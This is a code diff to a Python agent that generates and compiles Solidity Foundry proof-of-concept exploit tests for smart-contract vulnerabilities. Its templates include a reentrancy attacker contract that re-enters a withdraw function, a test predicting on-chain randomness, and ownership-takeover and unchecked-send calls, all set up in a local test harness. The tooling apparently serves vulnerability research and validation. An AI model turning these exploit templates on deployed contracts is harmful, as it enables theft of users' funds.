@@ -46,7 +46,7 @@ class GeneratorAgent:
         vulnerability = exploit_data.get("vulnerability", {})
         plan = exploit_data.get("exploit_plan", {}) or {}
         target = self._resolve_target(exploit_data)
-        validation_mode = self._validation_mode(vulnerability)
+        validation_mode = self._validation_mode(vulnerability, target)
         failures: List[str] = []
         previous_code = ""
         last_valid_code = ""
@@ -78,7 +78,7 @@ class GeneratorAgent:
                 continue
 
             last_valid_code = code
-            print_success(f"PoC validated (attempt {attempt}); compiling candidate.")
+            print_success(f"PoC source validated (attempt {attempt}); compiling candidate.")
             compile_result = self.compile_candidate(code, attempt=attempt)
             # Re-run deterministic repairs after Forge reports a failure.  A
             # model is not needed for the known mechanical mistakes repaired
@@ -102,6 +102,7 @@ class GeneratorAgent:
                             f"{'; '.join(repair_errors)}"
                         )
             last_compile_result = compile_result
+            self._write_target_artifact(target, attempt)
             if not compile_result["compiled"]:
                 # The compiler diagnostic is the actionable repair input.  Do
                 # not obscure it behind a generic generation failure.
@@ -121,7 +122,9 @@ class GeneratorAgent:
                 "exploit_file": filename,
                 "execution_command": f'forge test -vv --match-path "./{relative}"',
                 "target_contract": target,
+                "vulnerability": vulnerability,
                 "poc_strategy": validation_mode,
+                "lifecycle": {"generated": True, "source_validated": True, "compiled": True, "executed": False, "impact_demonstrated": False},
                 "compiled": True,
                 "compile_output": compile_result["output"],
                 "compile_stdout": compile_result["stdout"],
@@ -129,27 +132,29 @@ class GeneratorAgent:
                 "compile_time": compile_result["compile_time"],
             }
 
-        # A syntactically validated Solidity test is still a generated PoC
-        # even when local Forge is unavailable or its compiler rejects it.
-        # Persist it so Runner can independently compile/repair it and the
-        # report can distinguish generation from compilation.
+        # Source validation is not compilation.  Forge already supplied the
+        # diagnostics for every candidate, so do not send an uncompiled PoC
+        # into the execution/repair loop.  The per-attempt source and compiler
+        # streams were persisted by _write_compile_artifacts for investigation.
         if last_valid_code:
-            filename = self.save_poc_locally(last_valid_code, vulnerability.get("vulnerability_type", "unknown"))
-            relative = Path(filename).resolve().relative_to(self.exploit_root.resolve()).as_posix()
-            print_warning("PoC created but not compiled; forwarding it to Runner for repair.")
+            print_warning("PoC compilation failed; preserving diagnostics and skipping Runner execution.")
             return {
                 "exploit_code": last_valid_code,
-                "exploit_file": filename,
-                "execution_command": f'forge test -vv --match-path "./{relative}"',
+                "exploit_file": "",
+                "execution_command": "",
                 "target_contract": target,
-                "poc_strategy": validation_mode,
+                "vulnerability": vulnerability,
+                "poc_strategy": "compilation_failed",
+                "poc_status": "COMPILATION_FAILED",
+                "lifecycle": {"generated": True, "source_validated": True, "compiled": False, "executed": False, "impact_demonstrated": False},
                 "compiled": False,
                 "compile_output": last_compile_result.get("output", ""),
                 "compile_stdout": last_compile_result.get("stdout", ""),
                 "compile_stderr": last_compile_result.get("stderr", ""),
                 "compile_error": last_compile_result.get("compile_error", ""),
+                "compile_returncode": last_compile_result.get("returncode"),
                 "compile_time": last_compile_result.get("compile_time", 0.0),
-                "generation_error": "",
+                "generation_error": last_compile_result.get("compile_error", "PoC compilation failed."),
                 "validation_errors": failures,
             }
 
@@ -763,7 +768,7 @@ EXACT VALIDATION AND COMPILATION FAILURES TO FIX:
         if deterministic:
             return deterministic
         affected = ", ".join(self._extract_relevant_functions(vulnerability)) or "not specified"
-        strategy = self._validation_mode(vulnerability)
+        strategy = self._validation_mode(vulnerability, target)
         previous_failures = "None (first attempt)." if not failures else "\n".join(f"- {item}" for item in failures)
         target_import = f'import "../src/{target["filename"]}";'
         target_type = target["contract_name"]
@@ -848,7 +853,7 @@ OUTPUT ONLY SOLIDITY."""
         if not contract_match:
             errors.append("missing BaseTestWithBalanceLog test contract")
         setup = self._function_body(code, "setUp")
-        strategy = self._validation_mode(vulnerability)
+        strategy = self._validation_mode(vulnerability, target)
         test_name = "testExploit" if strategy == "executable" else "testDemonstration"
         test = self._function_body(code, test_name)
         # setUp is optional in Foundry.  Forge is the source of truth for a
@@ -859,14 +864,16 @@ OUTPUT ONLY SOLIDITY."""
         # expression accepted only one ordering and rejected valid generated
         # tests before Forge could compile them.
         test_signature = re.search(rf"function\s+{test_name}\s*\([^)]*\)\s*([^\{{]*)\{{", code)
-        if self._requires_exploit_actor(vulnerability) and (not test_signature or not re.search(r"\bbalanceLog\b", test_signature.group(1))):
+        if strategy == "executable" and self._requires_exploit_actor(vulnerability) and (not test_signature or not re.search(r"\bbalanceLog\b", test_signature.group(1))):
             errors.append(f"{test_name} does not use balanceLog")
-        if self._requires_exploit_actor(vulnerability) and "vm.deal" not in code:
+        if strategy == "executable" and self._requires_exploit_actor(vulnerability) and "vm.deal" not in code:
             errors.append("missing vm.deal for executable exploit")
-        if self._requires_exploit_actor(vulnerability) and not re.search(r"\bvm\.(?:prank|startPrank)\s*\(", code):
+        if strategy == "executable" and self._requires_exploit_actor(vulnerability) and not re.search(r"\bvm\.(?:prank|startPrank)\s*\(", code):
             errors.append("missing vm.prank or vm.startPrank for executable exploit")
         if not re.search(r"\b(?:assert|assertEq|assertTrue|assertFalse|assertGt|assertLt|assertGe|assertLe|require)\s*\(", code):
             errors.append("missing Foundry assertion")
+        if strategy == "executable" and not self._has_meaningful_impact_assertion(test):
+            errors.append("executable PoC lacks an observable security-impact assertion")
         if not re.search(rf"\b{re.escape(target['contract_name'])}\b", code):
             errors.append("target contract name is not used")
         source_functions = set(target.get("functions", []))
@@ -890,6 +897,25 @@ OUTPUT ONLY SOLIDITY."""
                 errors.append("reentrancy PoC must include a callback/fallback and a repeated re-entry call")
         return errors
 
+    @staticmethod
+    def _has_meaningful_impact_assertion(test_body: str) -> bool:
+        """Reject tautologies and call-success-only tests for executable PoCs."""
+        body = GeneratorAgent._without_comments(test_body or "")
+        if re.search(r"\bassertTrue\s*\(\s*true\s*\)", body, re.I):
+            return False
+        assertions = re.findall(
+            r"\b(?:assertEq|assertGt|assertLt|assertGe|assertLe|assertTrue|assertFalse)\s*\(([^;]+?)\)\s*;",
+            body,
+            re.S,
+        )
+        observable = re.compile(
+            r"\btarget\s*\.\s*[A-Za-z_]\w*\s*\(|"
+            r"address\s*\(\s*(?:target|attacker|receiver)\s*\)\s*\.\s*balance|"
+            r"\b(?:attacker|receiver)\s*\.\s*balance",
+            re.I,
+        )
+        return any(observable.search(assertion) for assertion in assertions)
+
     def compile_candidate(self, code: str, attempt: int = 0) -> Dict:
         """Compile in an isolated Foundry project without running any test.
 
@@ -901,6 +927,7 @@ OUTPUT ONLY SOLIDITY."""
         stdout = ""
         stderr = ""
         returncode = None
+        artifact_count = 0
         try:
             (validation_root / "test").mkdir(parents=True)
             self._copy_candidate_sources(code, validation_root / "src")
@@ -918,10 +945,9 @@ OUTPUT ONLY SOLIDITY."""
                 '[profile.default]\nsrc = "src"\ntest = "test"\nlibs = ["lib"]\nout = "out"\ncache_path = "cache"\n',
                 encoding="utf-8",
             )
-            # The workspace itself is ephemeral, so a local cache cannot
-            # leak into a later validation.  Avoid --no-cache because some
-            # Foundry releases still require a cache directory for signatures.
-            command = ["forge", "build"]
+            # Each validation tree is new, so caching cannot benefit a later
+            # candidate and must not leak stale artifacts into the result.
+            command = ["forge", "build", "--no-cache"]
             solc = shutil.which("solc")
             if solc:
                 command.extend(["--use", solc])
@@ -936,13 +962,14 @@ OUTPUT ONLY SOLIDITY."""
                 env=self._forge_env(),
             )
             stdout, stderr, returncode = result.stdout or "", result.stderr or "", result.returncode
+            artifact_count = sum(1 for _ in (validation_root / "out").rglob("*.json")) if (validation_root / "out").is_dir() else 0
         except (OSError, subprocess.TimeoutExpired) as exc:
             stderr = f"Unable to run forge build: {exc}"
         finally:
             compile_time = time.perf_counter() - started
             output = stdout + ("\n" if stdout and stderr else "") + stderr
-            compiled = returncode == 0
-            self._write_compile_artifacts(code, stdout, stderr, attempt)
+            compiled = returncode == 0 and artifact_count > 0
+            self._write_compile_artifacts(code, stdout, stderr, returncode, artifact_count, attempt)
             shutil.rmtree(validation_root, ignore_errors=True)
             parent = validation_root.parent
             try:
@@ -951,11 +978,15 @@ OUTPUT ONLY SOLIDITY."""
                 pass
         return {
             "compiled": compiled,
-            "compile_error": "" if compiled else (stderr or stdout or "Forge compilation failed with no diagnostic."),
+            "compile_error": "" if compiled else (
+                stderr or stdout or
+                ("Forge exited successfully but produced no contract artifacts." if returncode == 0 else "Forge compilation failed with no diagnostic.")
+            ),
             "stdout": stdout,
             "stderr": stderr,
             "output": output,
             "returncode": returncode,
+            "artifact_count": artifact_count,
             "compile_time": compile_time,
         }
 
@@ -992,14 +1023,18 @@ OUTPUT ONLY SOLIDITY."""
     def _solidity_imports(code: str) -> List[str]:
         return re.findall(r'^\s*import\s+(?:[^"\']+from\s+)?["\']([^"\']+)["\']\s*;', code, re.M)
 
-    def _write_compile_artifacts(self, code: str, stdout: str, stderr: str, attempt: int) -> None:
-        """Persist source and both Forge streams with a collision-proof name."""
+    def _write_compile_artifacts(self, code: str, stdout: str, stderr: str, returncode: Optional[int], artifact_count: int, attempt: int) -> None:
+        """Persist source, Forge streams, and exit status with a collision-proof name."""
         reports = self.project_root / "reports"
         reports.mkdir(exist_ok=True)
         prefix = reports / f"generator_{int(time.time() * 1000)}_{uuid.uuid4().hex}_attempt{attempt}_compile"
         prefix.with_suffix(".sol").write_text(code, encoding="utf-8")
         prefix.with_suffix(".stdout.log").write_text(stdout, encoding="utf-8")
         prefix.with_suffix(".stderr.log").write_text(stderr, encoding="utf-8")
+        prefix.with_suffix(".metadata.json").write_text(
+            json.dumps({"attempt": attempt, "returncode": returncode, "artifact_count": artifact_count}, indent=2),
+            encoding="utf-8",
+        )
 
     def _write_validation_artifacts(self, code: str, errors: List[str], attempt: int) -> None:
         """Persist pre-Forge validation failures without overwriting prior repairs."""
@@ -1010,6 +1045,16 @@ OUTPUT ONLY SOLIDITY."""
         prefix.with_suffix(".validator.log").write_text("\n".join(errors), encoding="utf-8")
         prefix.with_suffix(".stdout.log").write_text("", encoding="utf-8")
         prefix.with_suffix(".stderr.log").write_text("", encoding="utf-8")
+
+    def _write_target_artifact(self, target: Dict, attempt: int) -> None:
+        """Retain the exact target source used by a PoC attempt for diagnosis."""
+        source = target.get("source")
+        if not isinstance(source, str) or not source:
+            return
+        reports = self.project_root / "reports"
+        reports.mkdir(exist_ok=True)
+        filename = reports / f"generator_{int(time.time() * 1000)}_{uuid.uuid4().hex}_attempt{attempt}_target_{target.get('filename', 'contract.sol')}"
+        filename.write_text(source, encoding="utf-8")
 
     def _write_generation_log(self, attempt: int, stage: str, output: str) -> None:
         """Keep each generation diagnostic; never overwrite a prior investigation log."""
@@ -1073,20 +1118,34 @@ OUTPUT ONLY SOLIDITY."""
             return self._selfdestruct_poc(target, vulnerability)
         if "unchecked" in vuln_type or "low_level" in vuln_type:
             return self._unchecked_call_poc(target, vulnerability)
+        if "bad_randomness" in vuln_type or "randomness" in vuln_type:
+            return self._bad_randomness_poc(target, vulnerability)
         if "timestamp" in vuln_type:
             return self._timestamp_poc(target, vulnerability)
-        if (
-            vuln_type != "reentrancy"
-            or "deposit()" not in functions
-            or "withdraw(uint256)" not in functions
-            or not re.search(r"\.call\s*\{[^}]*value\s*:\s*amount[^}]*\}\s*\(\s*['\"]{2}\s*\)", source, re.I)
-            or not re.search(r"balances\s*\[\s*msg\.sender\s*\]\s*-=?=\s*amount", source)
-            or source.find("msg.sender.call") > source.find("balances[msg.sender] -= amount")
-        ):
+        affected = set(self._extract_relevant_functions(vulnerability))
+        withdraw = next((signature for signature in affected if signature in functions and signature.endswith("(uint256)")), "")
+        if not withdraw:
+            withdraw = next((signature for signature in functions if signature.startswith("withdraw") and signature.endswith("(uint256)")), "")
+        if (vuln_type != "reentrancy" or "deposit()" not in functions or not withdraw
+                or not re.search(r"\.call\s*\{[^}]*value\s*:\s*amount[^}]*\}\s*\(\s*['\"]{2}\s*\)", source, re.I)
+                or not re.search(r"balances\s*\[\s*msg\.sender\s*\]\s*-=?=\s*amount", source)):
             return ""
-
+        withdraw_name = withdraw.split("(", 1)[0]
         target_type = target["contract_name"]
         target_import = f'import "../src/{target["filename"]}";'
+        executable = self._reentrancy_can_demonstrate_excess_withdrawal(target)
+        test_name = "testExploit" if executable else "testDemonstration"
+        attack_assertions = '''
+        bool succeeded = receiver.attack{value: 1 ether}();
+        uint256 initialDeposit = 1 ether;
+        uint256 withdrawn = address(receiver).balance;
+        assertTrue(succeeded);
+        assertEq(withdrawn, 2 ether);
+        assertGt(address(receiver).balance, initialDeposit);''' if executable else '''
+        bool succeeded = receiver.attack{value: 1 ether}();
+        assertFalse(succeeded);
+        assertEq(address(receiver).balance, 0);
+        assertEq(target.balances(address(receiver)), 1 ether);'''
         return f'''// SPDX-License-Identifier: UNLICENSED
 pragma solidity {target.get("pragma", "^0.8.20")};
 
@@ -1096,6 +1155,7 @@ import "./basetest.sol";
 contract ReentrancyReceiver {{
     {target_type} private immutable target;
     uint256 private immutable amount;
+    uint256 private reentryCount;
 
     constructor({target_type} target_) {{
         target = target_;
@@ -1103,34 +1163,72 @@ contract ReentrancyReceiver {{
     }}
 
     receive() external payable {{
-        if (address(target).balance >= amount) {{
-            target.withdraw(amount);
+        if (reentryCount == 0) {{
+            reentryCount = 1;
+            target.{withdraw_name}(amount);
         }}
     }}
 
-    function attack() external payable {{
+    function attack() external payable returns (bool succeeded) {{
         require(msg.value == amount, "incorrect seed");
         target.deposit{{value: amount}}();
-        target.withdraw(amount);
+        (succeeded,) = address(target).call(
+            abi.encodeWithSelector(target.{withdraw_name}.selector, amount)
+        );
     }}
 }}
 
 contract PocTest is BaseTestWithBalanceLog {{
+    address attacker = address(0xBAD);
     {target_type} target;
     ReentrancyReceiver receiver;
-    address attacker = address(0xBAD);
 
     function setUp() public {{
         target = {self._constructor_call(target.get("constructor", "constructor()"), target_type)};
         receiver = new ReentrancyReceiver(target);
-        vm.deal(attacker, 10 ether);
-        vm.deal(address(target), 10 ether);
+        vm.deal(attacker, 1 ether);
+        vm.deal(address(target), 2 ether);
+    }}
+
+    function {test_name}() public balanceLog {{
+        vm.prank(attacker);
+{attack_assertions}
+    }}
+}}
+'''
+
+    def _bad_randomness_poc(self, target: Dict, vulnerability: Dict) -> str:
+        """Demonstrate prediction under deterministic local block controls."""
+        affected = set(self._extract_relevant_functions(vulnerability))
+        if ("guessNumber(uint256)" not in set(target.get("functions", []))
+                or "guessNumber(uint256)" not in affected
+                or "prizePool" not in target.get("public_members", [])):
+            return ""
+        target_type = target["contract_name"]
+        return f'''// SPDX-License-Identifier: UNLICENSED
+pragma solidity {target.get("pragma", "^0.8.20")};
+
+import "./basetest.sol";
+import "../src/{target["filename"]}";
+
+contract PocTest is BaseTestWithBalanceLog {{
+    {target_type} target;
+    address attacker = address(0xBAD);
+
+    function setUp() public {{
+        target = {self._constructor_call(target.get("constructor", "constructor()"), target_type)};
+        vm.deal(attacker, 2 ether);
     }}
 
     function testExploit() public balanceLog {{
+        vm.warp(1_700_000_000);
+        vm.prevrandao(bytes32(uint256(123)));
+        uint256 predicted = uint256(keccak256(abi.encodePacked(block.timestamp, block.prevrandao, attacker))) % 10;
         vm.prank(attacker);
-        receiver.attack{{value: 1 ether}}();
-        assertGt(address(receiver).balance, 1 ether);
+        target.guessNumber{{value: 1 ether}}(predicted);
+        // This confirms predictable local branch selection, not a universal
+        // production-chain exploitability claim.
+        assertEq(target.prizePool(), 2 ether);
     }}
 }}
 '''
@@ -1143,7 +1241,20 @@ contract PocTest is BaseTestWithBalanceLog {{
         if not candidates or "owner" not in target.get("public_members", []):
             return ""
         name = candidates[0].split("(", 1)[0]
-        return self._basic_poc(target, "testExploit", f"vm.prank(attacker);\n        target.{name}(attacker);\n        assertEq(target.owner(), attacker);", executable=True)
+        secure_name = ""
+        if name.endswith("Vulnerable"):
+            candidate_secure = f"{name[:-10]}Secure(address)"
+            if candidate_secure in functions:
+                secure_name = candidate_secure.split("(", 1)[0]
+        secure_check = (
+            f"vm.prank(attacker);\n        vm.expectRevert();\n        target.{secure_name}(attacker);\n        "
+            if secure_name else ""
+        )
+        return self._basic_poc(
+            target, "testExploit",
+            f"{secure_check}vm.prank(attacker);\n        target.{name}(attacker);\n        assertEq(target.owner(), attacker);",
+            executable=True,
+        )
 
     def _selfdestruct_poc(self, target: Dict, vulnerability: Dict) -> str:
         affected = set(self._extract_relevant_functions(vulnerability))
@@ -1162,7 +1273,12 @@ contract PocTest is BaseTestWithBalanceLog {{
         candidate = next((signature for signature in functions if signature in affected and signature == "unsafeSend(address,uint256)"), "")
         if not candidate:
             return ""
-        return self._basic_poc(target, "testExploit", "vm.prank(attacker);\n        target.unsafeSend(payable(attacker), 0);\n        assertEq(address(target).balance, 0);", executable=True)
+        return self._basic_poc(
+            target,
+            "testExploit",
+            "vm.deal(address(target), 1 ether);\n        uint256 attackerBalanceBefore = attacker.balance;\n        vm.prank(attacker);\n        target.unsafeSend(payable(attacker), 1 ether);\n        assertEq(attacker.balance, attackerBalanceBefore + 1 ether);",
+            executable=True,
+        )
 
     def _timestamp_poc(self, target: Dict, vulnerability: Dict) -> str:
         functions = set(target.get("functions", []))
@@ -1240,7 +1356,9 @@ contract PocTest is BaseTestWithBalanceLog {{
         defaults = []
         for parameter in params.split(","):
             solidity_type = parameter.strip().split()[0]
-            if solidity_type == "address" or solidity_type == "address payable":
+            if solidity_type == "address payable":
+                defaults.append("payable(address(0))")
+            elif solidity_type == "address":
                 defaults.append("address(0)")
             elif solidity_type == "bool":
                 defaults.append("false")
@@ -1257,11 +1375,32 @@ contract PocTest is BaseTestWithBalanceLog {{
         return f"new {contract_type}({', '.join(defaults)})"
 
     @staticmethod
-    def _validation_mode(vulnerability: Dict) -> str:
+    def _validation_mode(vulnerability: Dict, target: Optional[Dict] = None) -> str:
         vuln_type = str(vulnerability.get("vulnerability_type", "")).lower()
         if "informational" in vuln_type:
             return "informational"
+        if "reentrancy" in vuln_type:
+            return "executable" if target and GeneratorAgent._reentrancy_can_demonstrate_excess_withdrawal(target) else "regression"
+        if "bad_randomness" in vuln_type:
+            return "executable"
         return "demonstration" if any(label in vuln_type for label in ("timestamp", "random", "business logic")) else "executable"
+
+    @staticmethod
+    def _reentrancy_can_demonstrate_excess_withdrawal(target: Dict) -> bool:
+        """Whether the target's debit can remain below its reentrant payouts.
+
+        Solidity 0.8 checked arithmetic rolls back the complete call tree when
+        the outer post-call debit underflows.  An external call before a normal
+        checked ``balances -= amount`` is therefore not, by itself, a
+        drainable excess-withdrawal primitive.  Only use an executable drain
+        template when the source explicitly makes that debit unchecked.
+        """
+        source = target.get("source", "")
+        return bool(re.search(
+            r"\bunchecked\s*\{[\s\S]{0,2000}?\bbalances\s*\[\s*msg\.sender\s*\]\s*-=?=",
+            source,
+            re.I,
+        ))
 
     @staticmethod
     def _requires_exploit_actor(vulnerability: Dict) -> bool:
@@ -1278,7 +1417,7 @@ contract PocTest is BaseTestWithBalanceLog {{
         if local_errors:
             return "; ".join(local_errors)
 
-        strategy = self._validation_mode(vulnerability)
+        strategy = self._validation_mode(vulnerability, target)
         allowed_functions = sorted(set(target.get("functions", [])))
         allowed_members = sorted(set(target.get("public_members", [])))
         reported_affected = self._extract_relevant_functions(vulnerability)
@@ -1465,6 +1604,37 @@ SOLIDITY:
             insertion = f"pragma solidity {pragma};\n"
             code = code[:license_match.end()] + insertion + code[license_match.end():] if license_match else insertion + code
 
+        # Solc 0.8 forbids conversion from uint256 directly to address, but a
+        # contract instance can be converted directly with address(instance).
+        # Restrict this mechanical repair to declared integer variables (and
+        # conventional loop indices); rewriting every identifier corrupted
+        # address(target) and address(receiver) in reentrancy PoCs.
+        integer_variables = set(re.findall(r"\b(?:u?int(?:8|16|24|32|40|48|56|64|72|80|88|96|104|112|120|128|136|144|152|160|168|176|184|192|200|208|216|224|232|240|248|256)?)\s+([A-Za-z_]\w*)", code))
+        integer_variables.update({"i", "j", "k", "idx", "index"})
+
+        def repair_numeric_address_cast(match):
+            operand = match.group(1)
+            return f"address(uint160({operand}))" if operand in integer_variables else match.group(0)
+
+        code = re.sub(r"\baddress\s*\(\s*([A-Za-z_]\w*)\s*\)", repair_numeric_address_cast, code)
+
+        # Do not redeclare an imported target contract as the test contract.
+        # The imported target name is authoritative; use a dedicated test name.
+        target_name = target.get("contract_name", "")
+        if target_name:
+            code = re.sub(
+                rf"\bcontract\s+{re.escape(target_name)}\s+is\s+BaseTestWithBalanceLog\b",
+                "contract PocTest is BaseTestWithBalanceLog",
+                code,
+            )
+
+        # A mapping getter is named after the mapping.  Repair a common model
+        # hallucination only when the target explicitly exposes that getter.
+        members = set(target.get("public_members", []))
+        functions = {item.split("(", 1)[0] for item in target.get("functions", [])}
+        if "balances" in members and "balanceOf" not in functions:
+            code = re.sub(r"\btarget\s*\.\s*balanceOf\s*\(", "target.balances(", code)
+
         # Generated test and helper contracts do not inherit an interface that
         # requires overrides.  Removing a stray override is safer than trying
         # to infer a parent declaration from generated Solidity.
@@ -1488,7 +1658,7 @@ SOLIDITY:
             code,
         )
 
-        strategy = self._validation_mode(vulnerability)
+        strategy = self._validation_mode(vulnerability, target)
         test_name = "testExploit" if strategy == "executable" else "testDemonstration"
         actor_required = self._requires_exploit_actor(vulnerability)
         test_match = re.search(rf"\bfunction\s+{test_name}\s*\([^)]*\)([^{{]*)\{{", code)
@@ -1517,8 +1687,8 @@ SOLIDITY:
         if actor_required and not re.search(r"\bvm\.(?:prank|startPrank)\s*\(", code):
             code = self._prepend_to_function(code, test_name, "vm.prank(attacker);")
 
-        if test_match and not re.search(r"\b(?:assert|assertEq|assertTrue|assertFalse|assertGt|assertLt|assertGe|assertLe|require)\s*\(", self._function_body(code, test_name)):
-            code = self._append_to_function(code, test_name, "assertTrue(true);")
+        # Do not add a tautological assertion.  The candidate must be repaired
+        # with an assertion tied to the reported security impact.
         return code
 
     @staticmethod
